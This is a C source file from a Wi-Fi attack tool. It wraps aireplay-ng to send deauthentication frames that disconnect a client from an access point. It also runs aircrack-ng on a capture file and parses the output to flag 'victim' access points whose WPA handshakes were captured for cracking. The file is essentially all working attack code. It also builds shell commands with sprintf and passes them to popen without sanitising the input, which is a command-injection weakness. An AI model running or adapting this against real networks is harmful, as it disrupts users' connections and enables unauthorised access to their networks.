#include "collection.h"

extern char* wireless_device;
extern WINDOW* data;
extern step;

void runDeauth(char* ap_bssid, char* client_bssid){
    char command[100] = ""; 
    sprintf(command, "aireplay-ng --deauth 10 -a %s -c %s %s", ap_bssid, client_bssid, wireless_device);
        
    FILE* commands = popen(command, "r");
    size_t buffer_sz = 75;
    char* buffer = (char*)malloc(buffer_sz);
    int line_length = 0;
    while( (line_length = getline(&buffer, &buffer_sz, commands)) != -1){
        buffer[line_length-1] = '\0'; //strip new line
        //wprintw(data, "Aireplay: %s\n", buffer);
        if(strstr(buffer, "No such BSSID available.") != NULL){
            wprintw(data, "ERROR: AP NOT FOUND BY AIRCRACK\n");
            break;
        }
    }
    free(buffer);
    pclose(commands);
}
bool checkKey(AP* victim_APs, int num_victims, char* filename){
    //APs that may have been attacked on this channel
    //aircrack command variables
    char command[100] = ""; 
    FILE* commands;
    int line_length = 0;
    size_t buffer_sz = 255*sizeof(char);
    char* buffer = malloc(buffer_sz);
    bool captured = false;

    //run aircrack command and store output
    sprintf(command, "echo \"0\" | aircrack-ng %s 2> /dev/null", filename);
    commands = popen(command, "r");
    step = STEP_HANDSHAKE_CHECKING;
    if(commands == NULL){
        wprintw(data, "ERROR RUNNING AIRCRACK-NG\n");
        exit(1);
    }
    
    //Setup regular expression for BSSIDs
    regex_t isBSSID;
    if(regcomp(&isBSSID, BSSID_REGEX, REG_EXTENDED))
        printf("compilation of regex failed!\n");
    
    //parse aircrack output to see which APs have handshakes captured
    while( (line_length = getline(&buffer, &buffer_sz, commands)) != -1){
        char station_BSSID[19] = "";
        int num_handshakes = 0;
        //tokenize line to parse individual fields
        char* token = strtok(buffer," ");
        do{
            //if regex matches BSSID format, then is BSSID
            if(!regexec(&isBSSID, token, 0, NULL, 0)){
                //save BSSID in case of handshake
                memcpy(station_BSSID, token, 18);
            }
            //if WPA encryption detected, grab remaining tokens to be processed for potential handshake
            if(strcmp(token, "WPA") == 0){
                token = strtok(NULL,"\n");
                break;
            }
            //keep parsing
        }while( (token = strtok(NULL, " ")) != NULL );

        //process potential handshake
        if(token != NULL){
            sscanf(token, "(%d handshake)", &num_handshakes);
            //if no handshakes found process next line
            if(num_handshakes == 0) continue;
            //if handshake found update AP entry to stop intrusive attacks
            BSSID victim;
            PACK_BSSID(station_BSSID, &victim);
            //find AP with corresponding BSSID
            for(int i = 0; i < num_victims; i++){
                if(memcmp(&victim_APs[i], &victim, sizeof(BSSID)) == 0){
                    captured = true;
                    victim_APs[i].keyCaptured = true;
                }
            }
        }
    }
    regfree(&isBSSID);
    free(buffer);
    pclose(commands);
    return captured;
}